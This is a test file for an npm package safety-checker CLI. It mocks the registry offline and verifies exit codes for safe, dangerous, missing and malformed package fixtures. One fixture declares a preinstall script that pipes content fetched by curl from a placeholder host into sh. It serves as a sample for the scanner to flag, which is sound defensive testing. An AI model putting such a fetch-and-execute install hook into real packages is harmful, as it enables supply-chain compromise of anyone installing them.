import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import type { BatchPackageResult, CheckResult } from '../src/index.js';

const PACKAGE_DIR = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const CLI_TS = path.join(PACKAGE_DIR, 'src', 'cli', 'cli.ts');

function metadata(name: string, manifest: Record<string, unknown> = {}) {
  return {
    name, modified: '2025-01-01T00:00:00.000Z', readme: '',
    'dist-tags': { latest: '1.0.0' },
    versions: { '1.0.0': {
      name, version: '1.0.0',
      dist: { tarball: `https://registry.npmjs.org/${name}/-/${name}-1.0.0.tgz` },
      ...manifest,
    } },
  };
}

type CliRun = (args: string[]) => { stdout: string; stderr: string; status: number | null };

/** Exercise the real CLI and scanner, replacing only HTTP with fixed responses. */
function withRegistry(test: (run: CliRun) => void): void {
  const home = mkdtempSync(path.join(os.tmpdir(), 'npm-safe-check-exit-'));
  try {
    const fixtures = {
      'safe-fixture': metadata('safe-fixture'),
      'safe-second': metadata('safe-second'),
      'dangerous-fixture': metadata('dangerous-fixture', {
        scripts: { preinstall: 'curl https://payload.invalid/content | sh' },
      }),
      'incomplete-fixture': metadata('incomplete-fixture', {
        dist: { tarball: 'https://untrusted.invalid/package.tgz' },
      }),
      'broken-fixture': { ...metadata('broken-fixture'), 'dist-tags': { latest: '2.0.0' } },
    };
    const fixtureFile = path.join(home, 'registry.json');
    const preload = path.join(home, 'registry.mjs');
    writeFileSync(fixtureFile, JSON.stringify(fixtures));
    writeFileSync(preload, `
      import { readFileSync } from 'node:fs';
      const fixtures = JSON.parse(readFileSync(process.env.NPM_SAFE_CHECK_FIXTURES, 'utf8'));
      globalThis.fetch = async (input) => {
        const url = new URL(typeof input === 'string' ? input : input.url ?? String(input));
        if (url.origin !== 'https://registry.npmjs.org') throw new Error('Unexpected offline request: ' + url);
        const name = decodeURIComponent(url.pathname.slice(1));
        return new Response(JSON.stringify(fixtures[name] ?? {}), {
          status: Object.hasOwn(fixtures, name) ? 200 : 404,
          headers: { 'content-type': 'application/json' },
        });
      };
    `);
    test((args) => {
      const result = spawnSync(process.execPath, [
        '--import', pathToFileURL(preload).href, '--import', 'tsx', CLI_TS,
        '--db', path.join(home, 'cache.db'), ...args,
      ], {
        encoding: 'utf8', cwd: PACKAGE_DIR, timeout: 30_000,
        env: {
          ...process.env, HOME: home, USERPROFILE: home,
          OPENAI_API_KEY: '', ANTHROPIC_API_KEY: '', GEMINI_API_KEY: '', GOOGLE_API_KEY: '',
          NPM_SAFE_CHECK_FIXTURES: fixtureFile,
        },
      });
      if (result.error) throw result.error;
      return { stdout: result.stdout, stderr: result.stderr, status: result.status };
    });
  } finally { rmSync(home, { recursive: true, force: true }); }
}

describe('check exit codes with offline registry fixtures', () => {
  for (const fixture of [
    { name: 'safe-fixture', level: 'safe', status: 0, args: [] },
    { name: 'dangerous-fixture', level: 'dangerous', status: 1, args: [] },
    { name: 'missing-fixture', level: 'unknown', status: 1, args: [] },
    { name: 'incomplete-fixture', level: 'unknown', status: 1, args: ['--deep'] },
  ]) {
    it(`preserves the single-package exit code for ${fixture.name} in JSON mode`, () => {
      withRegistry((run) => {
        const args = ['check', fixture.name, ...fixture.args];
        const json = run([...args, '--json']);
        const report = JSON.parse(json.stdout) as CheckResult;
        assert.equal(report.security.overallLevel, fixture.level);
        assert.equal(report.exists, fixture.name !== 'missing-fixture');
        assert.equal(json.status, fixture.status, json.stderr);
        assert.equal(run(args).status, fixture.status);
      });
    });
  }

  for (const fixture of [
    { name: 'safe-second', status: 0, ok: true, exists: true },
    { name: 'dangerous-fixture', status: 2, ok: true, exists: true },
    { name: 'missing-fixture', status: 2, ok: true, exists: false },
    { name: 'broken-fixture', status: 2, ok: false, exists: undefined },
  ]) {
    it(`preserves the batch exit code for ${fixture.name} in JSON mode`, () => {
      withRegistry((run) => {
        const args = ['check', 'safe-fixture', fixture.name];
        const json = run([...args, '--json']);
        const report = JSON.parse(json.stdout) as BatchPackageResult[];
        assert.equal(report.length, 2);
        assert.equal(report[1].ok, fixture.ok);
        assert.equal(report[1].result?.exists, fixture.exists);
        assert.equal(json.status, fixture.status, json.stderr);
        assert.equal(run(args).status, fixture.status);
      });
    });
  }

  it('retains failure status for a refreshed JSON check and its saved detail', () => {
    withRegistry((run) => {
      const refreshed = run(['check', 'dangerous-fixture', '--refresh', '--json']);
      const batch = JSON.parse(refreshed.stdout) as BatchPackageResult[];
      assert.equal(batch[0].result?.security.overallLevel, 'dangerous');
      assert.equal(refreshed.status, 2, refreshed.stderr);
      const detail = run(['check', 'detail', '1', '--json']);
      assert.equal((JSON.parse(detail.stdout) as CheckResult).security.overallLevel, 'dangerous');
      assert.equal(detail.status, 1, detail.stderr);
      assert.equal(run(['check', 'detail', '1']).status, 1);
    });
  });

  it('applies the same failure status to global JSON shorthand checks', () => {
    withRegistry((run) => {
      const result = run(['--json', 'dangerous-fixture']);
      assert.equal((JSON.parse(result.stdout) as CheckResult).security.overallLevel, 'dangerous');
      assert.equal(result.status, 1, result.stderr);
    });
  });
});
